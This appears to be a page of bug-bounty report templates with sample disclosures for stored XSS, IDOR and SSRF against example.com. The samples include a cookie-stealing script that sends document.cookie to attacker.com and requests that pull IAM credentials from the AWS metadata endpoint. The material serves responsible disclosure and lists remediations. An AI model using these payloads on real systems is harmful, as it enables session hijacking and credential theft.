# Report Templates

Copy, adapt, submit.

## Generic Template

```markdown
## Summary

[One paragraph: what, where, impact]

## Vulnerability Type

[e.g., Stored XSS, IDOR, SSRF]

## Affected Endpoint

- URL: 
- Method: 
- Parameter: 

## Steps to Reproduce

1. 
2. 
3. 

## Proof of Concept

[Payload, request, or script]

## Impact

[Specific impact statement - see Impact Wording]

## Suggested Remediation

[Optional: how to fix]

## Supporting Material

[Screenshots, videos, Burp exports]
```

## XSS Report

```markdown
## Summary

A stored cross-site scripting vulnerability exists in the user profile bio field. An attacker can inject malicious JavaScript that executes when any user views the attacker's profile, allowing session hijacking and account takeover.

## Vulnerability Type

Stored Cross-Site Scripting (XSS)

## Affected Endpoint

- URL: https://example.com/api/profile/update
- Method: POST
- Parameter: `bio`

## Steps to Reproduce

1. Login to the application
2. Navigate to profile settings
3. In the "Bio" field, enter: `<script>alert(document.cookie)</script>`
4. Save the profile
5. Have another user (or incognito session) view your profile
6. Observe the JavaScript executes in the victim's browser

## Proof of Concept

**Payload:**
```html
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

**Request:**
```http
POST /api/profile/update HTTP/1.1
Host: example.com
Content-Type: application/json

{"bio": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"}
```

[Screenshot of alert popup]

## Impact

An attacker can steal session cookies from any user who views their profile. This leads to complete account takeover. Given the profile is visible on public search and forum posts, this could affect a large number of users including administrators.

## Suggested Remediation

- Sanitize user input before storing
- Implement Content Security Policy
- Use output encoding when rendering user content
```

## IDOR Report

```markdown
## Summary

An insecure direct object reference vulnerability allows any authenticated user to access, modify, or delete other users' private documents by changing the document ID parameter.

## Vulnerability Type

Insecure Direct Object Reference (IDOR)

## Affected Endpoint

- URL: https://example.com/api/documents/{id}
- Methods: GET, PUT, DELETE
- Parameter: `id` (path parameter)

## Steps to Reproduce

1. Create two accounts: Attacker (user A) and Victim (user B)
2. As Victim, create a private document. Note the document ID (e.g., 12345)
3. As Attacker, send: `GET /api/documents/12345`
4. Observe: Attacker can view Victim's private document

## Proof of Concept

**Request (as user A, accessing user B's document):**
```http
GET /api/documents/12345 HTTP/1.1
Host: example.com
Authorization: Bearer [USER_A_TOKEN]
```

**Response:**
```json
{
  "id": 12345,
  "owner": "user_b",
  "title": "Private Financial Records",
  "content": "..."
}
```

## Impact

Any authenticated user can:
- Read any other user's private documents (confidentiality breach)
- Modify any document (integrity violation)  
- Delete any document (availability impact)

This exposes all user documents including sensitive financial and personal information.

## Suggested Remediation

Implement proper authorization checks:
```python
if document.owner_id != current_user.id:
    return 403 Forbidden
```
```

## SSRF Report

```markdown
## Summary

A server-side request forgery vulnerability in the URL preview feature allows an attacker to make requests to internal services and access AWS metadata, potentially compromising cloud infrastructure.

## Vulnerability Type

Server-Side Request Forgery (SSRF)

## Affected Endpoint

- URL: https://example.com/api/preview
- Method: POST
- Parameter: `url`

## Steps to Reproduce

1. Login to the application
2. Use the "Preview Link" feature
3. Enter URL: `http://169.254.169.254/latest/meta-data/`
4. Observe: Server returns AWS metadata

## Proof of Concept

**Request:**
```http
POST /api/preview HTTP/1.1
Host: example.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Response:**
```json
{
  "preview": "ec2-role-name"
}
```

**Retrieving credentials:**
```http
POST /api/preview HTTP/1.1
Host: example.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"}
```

## Impact

An attacker can:
- Access AWS instance metadata including IAM credentials
- Use stolen credentials to access other AWS services
- Potentially compromise entire cloud infrastructure
- Access internal services not exposed to internet

## Suggested Remediation

- Whitelist allowed URL schemes and domains
- Block requests to internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
- Use IMDSv2 which requires session tokens
```

---

*More templates coming soon. [Contribute](../contributing.md) your own!*
